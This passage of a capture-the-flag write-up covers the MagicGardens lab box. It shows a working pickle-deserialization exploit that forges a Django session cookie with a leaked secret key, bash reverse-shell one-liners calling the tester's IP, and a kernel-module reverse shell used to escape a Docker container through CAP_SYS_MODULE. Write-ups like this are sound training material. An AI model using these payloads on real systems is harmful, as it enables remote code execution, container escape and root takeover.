    self._setup(name)
  File "/home/oxdf/django/venv/lib/python3.12/site-packages/django/conf/__init__.py", line 82, in _setup
    raise ImproperlyConfigured(
django.core.exceptions.ImproperlyConfigured: Requested setting SECRET_KEY_FALLBACKS, but settings are not configured. You must either define the environment variable DJANGO_SETTINGS_MODULE or call settings.configure() before accessing settings.

```

Some work with ChatGPT helps me to solve this by adding in session initiation, which stores the secret in the session and allows removing it from the `loads` and `dumps` calls:

```

import django.core.signing, django.contrib.sessions.serializers
import os
from django.conf import settings

settings.configure(SECRET_KEY='55A6cc8e2b8#ae1662c34)618U549601$7eC3f0@b1e8c2577J22a8f6edcb5c9b80X8f4&87b')
cookie='.eJxNjU1qwzAQhZNFQgMphZyi3QhLluNoV7rvqgcwkixFbhMJ9EPpotADzHJ63zpuAp7d977Hm5_V7265mO4bH-GuJBO9PBuE1TnE_IWwTlnmksbgLUtrETafQ3LdaUgZYYGwnVCH4rOJ6Naw0TLmfz_SdqKZvu9kya67POqGHmHJEHazTEn9Yfwonvp36Y-B6OBzHBS5VMjVJvIaenN6uXUfZgNOJofwTBttmW0FrU3VcGbMgWlRKcWptIIy2Ryqfa1t0-o9VYqpyrCaG061amuuhcBC_gDes2X7:1tecu5:oPSudCgAnfUwcXeLzEYI0JyLYEiYp0zWMnetW6Tdjhs'
newContent =  django.core.signing.loads(cookie,serializer=django.contrib.sessions.serializers.PickleSerializer,salt='django.contrib.sessions.backends.signed_cookies')
class PickleRce(object):
    def __reduce__(self):
        return (os.system,("sleep 30",))
newContent['testcookie'] = PickleRce()

print(django.core.signing.dumps(newContent,serializer=django.contrib.sessions.serializers.PickleSerializer,salt='django.contrib.sessions.backends.signed_cookies',compress=True))

```

Running this generates a new cookie:

```

(venv) oxdf@hacky$ python django_exploit.py 
.eJxNkLFOw0AQRJMiUYKCkPgCSmgs-2wncQf0NPAB1t15Dx-xfZFvLUiBREO3Hcv_YhuQvN3MG81K87H4vpvPxnvna1p1HtpG1sC0qF2LJ6alR4md740nlMYwrV-tL_PKemSaMW1GqV3XILRcLmmtZYu_vFebUU3weS47LPPhUW4Lprlgupx4SuoDND24KV5k8-wC7RpsrQqGSPBHffDgCqju_7MXk4JS-pLpNkq1EWaXRTGEaSIA9kJnoVJJJE0WCZnuw22sTbrT20gpoUIQcQJJpNUuTnSWMZ0heNTOHewwx9F5-zbMcfIINX8xrXwFcLyKQ_7kR-6CH67SeZs:1tezvv:AuLx3VAdK8TVvP-1OTIKz1s_pHcWLW3BlcCTwRCGPJs

```

I’ll set this as my cookie in the browser dev tools, and refresh the main page. It takes over 30 seconds to load (on account of the 30 second sleep)! That’s RCE!

#### Shell

I’ll clean up the script a bit, and bring in `requests` to make the request for me, avoiding having to update the cookie in dev tools:

```

import os
import sys
import django.core.signing
import requests
from django.conf import settings
from django.contrib.sessions.serializers import PickleSerializer

class PickleRCE(object):
    def __reduce__(self):
        #return (os.system, ("sleep 30",))
        #return (os.system, ("ping -c 1 10.10.14.6",))
        # return (os.system, ("curl 10.10.14.6/django",))
        return (os.system, (f"bash -c 'bash -i >& /dev/tcp/{sys.argv[2]}/{sys.argv[3]} 0>&1'",))

if len(sys.argv) != 4:
    print(f"{sys.argv[0]} <url> <shell ip> <shell port>")
    sys.exit(1)

url = sys.argv[1] if sys.argv[1].startswith('http') else f'http://{sys.argv[1]}'

salt = "django.contrib.sessions.backends.signed_cookies"
settings.configure(SECRET_KEY="55A6cc8e2b8#ae1662c34)618U549601$7eC3f0@b1e8c2577J22a8f6edcb5c9b80X8f4&87b")
cookie = ".eJxNjU1qwzAQhZNFQgMphZyi3QhLluNoV7rvqgcwkixFbhMJ9EPpotADzHJ63zpuAp7d977Hm5_V7265mO4bH-GuJBO9PBuE1TnE_IWwTlnmksbgLUtrETafQ3LdaUgZYYGwnVCH4rOJ6Naw0TLmfz_SdqKZvu9kya67POqGHmHJEHazTEn9Yfwonvp36Y-B6OBzHBS5VMjVJvIaenN6uXUfZgNOJofwTBttmW0FrU3VcGbMgWlRKcWptIIy2Ryqfa1t0-o9VYqpyrCaG061amuuhcBC_gDes2X7:1tecu5:oPSudCgAnfUwcXeLzEYI0JyLYEiYp0zWMnetW6Tdjhs"
cookie_obj = django.core.signing.loads(cookie, serializer=PickleSerializer,salt=salt)
cookie_obj['testcookie'] = PickleRCE()

new_cookie = django.core.signing.dumps(cookie_obj,serializer=PickleSerializer,salt=salt,compress=True)
print(f"[+] Generated malicious cookie: {new_cookie}")
requests.get("http://magicgardens.htb", cookies={"sessionid": new_cookie})

```

Running this prints the cookie and then hangs:

```

(venv) oxdf@hacky$ python exploit_django.py magicgardens.htb 10.10.14.6 443
[+] Generated malicious cookie: .eJxNUD1PwzAQbYdWFBUh8QsytTDgxI7TNkuF2FngB0T2xSHuR1zFDtABiYXNW4__S9KC1NMN9z50T3pfg59Vv3ecT7z1F41VdSW2Cv1ga2q3Rz-0TrjGtsSLE0WBfvSubZlttHXoe-jHRwimqZyqsRz6EYjanfQWjY_oTL7KROPKrAvKdI6-z9DfnHFSwFpVrXCXr0T1agiYytVaks5C_lRLnkyuNo__3uuzB6WwJfoHmkDBinlKYxUlnCm1YJBGUnIqipQykSyiWQxFMocZlZLJSLGYK05BzmMOaYr-0inrwJi17urYGas_ujr21qktHtBT2SYF9xBMT4cOlpMgzNVb6GAX0oh0y8ks5DwOouWETvEbn7Ehvwv8g64:1tf05O:36KoJRVw6IGoYeSGsNuSouYC6ZkTXxw7v6ZzdejDfk0

```

At `nc`, there’s a shell:

```

oxdf@hacky$ nc -lnvp 443
Listening on 0.0.0.0 443
Connection received on 10.10.11.9 33824
bash: cannot set terminal process group (16): Inappropriate ioctl for device
bash: no job control in this shell
root@5e5026ac6a81:/usr/src/app# 

```

I’ll upgrade the shell using the [standard trick](https://www.youtube.com/watch?v=DqE6DxqJg8Q):

```

root@5e5026ac6a81:/usr/src/app# script /dev/null -c bash
script /dev/null -c bash
Script started, output log file is '/dev/null'.
root@5e5026ac6a81:/usr/src/app# ^Z
[1]+  Stopped                 nc -lnvp 443
oxdf@hacky$ stty raw -echo; fg
nc -lnvp 443
            reset
reset: unknown terminal type unknown
Terminal type? screen
root@5e5026ac6a81:/usr/src/app#

```

## Shell as root

### Enumeration

Looking around the filesystem, it very much matches up with what I got from the Docker Registry.

The shell is in the `/usr/src/app` directory where the Django application is:

```

root@5e5026ac6a81:/usr/src/app# ls
app         entrypoint.sh  media             static
db.sqlite3  manage.py      requirements.txt  store

```

The hostname is a random 12 characters (as is typical for Docker containers) and there’s no root.txt.

`capsh` shows the privileges for the container:

```

root@5e5026ac6a81:/# capsh --print
Current: cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_module,cap_sys_chroot,cap_audit_write,cap_setfcap=ep
Bounding set =cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_module,cap_sys_chroot,cap_audit_write,cap_setfcap
Ambient set =
Current IAB: !cap_dac_read_search,!cap_linux_immutable,!cap_net_broadcast,!cap_net_admin,!cap_ipc_lock,!cap_ipc_owner,!cap_sys_rawio,!cap_sys_ptrace,!cap_sys_pacct,!cap_sys_admin,!cap_sys_boot,!cap_sys_nice,!cap_sys_resource,!cap_sys_time,!cap_sys_tty_config,!cap_mknod,!cap_lease,!cap_audit_control,!cap_mac_override,!cap_mac_admin,!cap_syslog,!cap_wake_alarm,!cap_block_suspend,!cap_audit_read,!cap_perfmon,!cap_bpf,!cap_checkpoint_restore
Securebits: 00/0x0/1'b0 (no-new-privs=0)
 secure-noroot: no (unlocked)
 secure-no-suid-fixup: no (unlocked)
 secure-keep-caps: no (unlocked)
 secure-no-ambient-raise: no (unlocked)
uid=0(root) euid=0(root)
gid=0(root)
groups=0(root)
Guessed mode: HYBRID (4)

```

### Kernel Module

#### Strategy

The most obviously exploitable capability in the `capsh` output is `cap_sys_module`, which allows the container to load and unload kernel modules.

A post form RedFox Security, [Exploiting Linux Capabilities: CAP\_SYS\_MODULE](https://redfoxsec.com/blog/exploiting-linux-capabilities-capsysmodule-exploits/), shows exactly how to create a kernel module that will return a reverse shell when run. HackTricks has [a section](https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/linux-capabilities.html#cap_sys_module) on abusing this as well, and the “Example with environment (Docker breakout)” fits exactly here.

#### Exploit

I’ll grab the POC module / reverse shell from the HackTricks page and update it for host IP / port:

```

#include <linux/kmod.h>
#include <linux/module.h>
MODULE_LICENSE("GPL");
MODULE_AUTHOR("AttackDefense");
MODULE_DESCRIPTION("LKM reverse shell module");
MODULE_VERSION("1.0");

char* argv[] = {"/bin/bash","-c","bash -i >& /dev/tcp/10.10.14.6/443 0>&1", NULL};
static char* envp[] = {"PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin", NULL };

// call_usermodehelper function is used to create user mode processes from kernel space
static int __init reverse_shell_init(void) {
    return call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
}

static void __exit reverse_shell_exit(void) {
    printk(KERN_INFO "Exiting\n");
}

module_init(reverse_shell_init);
module_exit(reverse_shell_exit);

```

I’ll also save a copy of their `Makefile`:

```

obj-m +=reverse-shell.o

all:
        make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules

clean:
        make -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean

```

From the container, I’ll upload these:

```

root@5e5026ac6a81:/dev/shm# wget 10.10.14.6/reverse-shell.c
--2025-02-03 18:04:25--  http://10.10.14.6/reverse-shell.c
Connecting to 10.10.14.6:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 715 [text/x-csrc]
Saving to: ‘reverse-shell.c’

rev.c               100%[===================>]     715  --.-KB/s    in 0s      

2025-02-03 18:04:26 (1.86 MB/s) - ‘reverse-shell.c’ saved [715/715]

root@5e5026ac6a81:/dev/shm# wget 10.10.14.6/Makefile
--2025-02-03 18:04:29--  http://10.10.14.6/Makefile
Connecting to 10.10.14.6:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 168 [application/octet-stream]
Saving to: ‘Makefile’

Makefile            100%[===================>]     168  --.-KB/s    in 0s      

2025-02-03 18:04:29 (644 KB/s) - ‘Makefile’ saved [168/168]

```

`make` will compile them for this system:

```

root@5e5026ac6a81:/dev/shm# make                    
make -C /lib/modules/6.1.0-20-amd64/build M=/dev/shm modules
make[1]: Entering directory '/usr/src/linux-headers-6.1.0-20-amd64'
  CC [M]  /dev/shm/reverse-shell.o
  MODPOST /dev/shm/Module.symvers
  CC [M]  /dev/shm/reverse-shell.mod.o
  LD [M]  /dev/shm/reverse-shell.ko
  BTF [M] /dev/shm/reverse-shell.ko
Skipping BTF generation for /dev/shm/reverse-shell.ko due to unavailability of vmlinux
make[1]: Leaving directory '/usr/src/linux-headers-6.1.0-20-amd64'

```

This will error if the space before each line in the `Makefile` are spaces rather than a tab.

Now I’ll run `insmod reverse-shell.ko` to load the module, and on doing so, I’ll get a connection back at `nc` with a root shell on the host:

```

oxdf@hacky$ nc -lnvp 443
Listening on 0.0.0.0 443
Connection received on 10.10.11.9 58376
bash: cannot set terminal process group (-1): Inappropriate ioctl for device
bash: no job control in this shell
root@magicgardens:/# 

```

I’ll upgrade my shell:

```

root@magicgardens:/# script /dev/null -c bash
script /dev/null -c bash
Script started, output log file is '/dev/null'.
root@magicgardens:/# ^Z
[1]+  Stopped                 nc -lnvp 444
(venv) oxdf@hacky$ stty raw -echo; fg
nc -lnvp 444
            reset
reset: unknown terminal type unknown
Terminal type? screen
root@magicgardens:/#

```

And grab `root.txt`:

```

root@magicgardens:/root# cat root.txt
396b3686************************

```